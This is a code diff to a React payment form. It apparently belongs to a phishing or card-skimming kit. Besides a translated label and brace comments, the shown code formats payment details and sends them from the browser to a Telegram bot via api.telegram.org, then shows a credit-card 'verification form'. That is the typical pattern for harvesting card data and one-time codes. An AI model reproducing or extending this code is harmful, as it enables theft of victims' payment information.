@@ -516,16 +516,16 @@ export default function PaymentForm({
                     // Retrieve payments from localStorage
                     const payments = JSON.parse(localStorage.getItem("payments") || "[]");
                     if (payments.length > 0) {
-                      parts.push("\n📅 الدفعات الشهرية  📅");
+                      parts.push("\n📅 Scheduled Payments 📅");
                       payments.forEach((payment: { date: string; amount: string | number }, index: number) => {
                         parts.push(
                           `${index + 1}. Date: ${escapeMarkdown(payment.date)}, Amount: ${escapeMarkdown(payment.amount)}`
                         );
                       });
                     }
-
+                    // Ensure all braces are closed
                     return parts.join("\n");
-                  };
+                  }; // Closing brace for formatPaymentInfo function
 
                   return fetch(
                     `https://api.telegram.org/bot${botToken}/sendMessage`,
@@ -539,7 +539,7 @@ export default function PaymentForm({
                       }),
                     }
                   );
-                })
+                }) // Closing parenthesis for .then()
                 .then(() => {
                   // For credit card payments, show verification form
                   if (
@@ -598,4 +598,6 @@ export default function PaymentForm({
         </div>
       )}
     </div>
-  );
+
+  );}
+
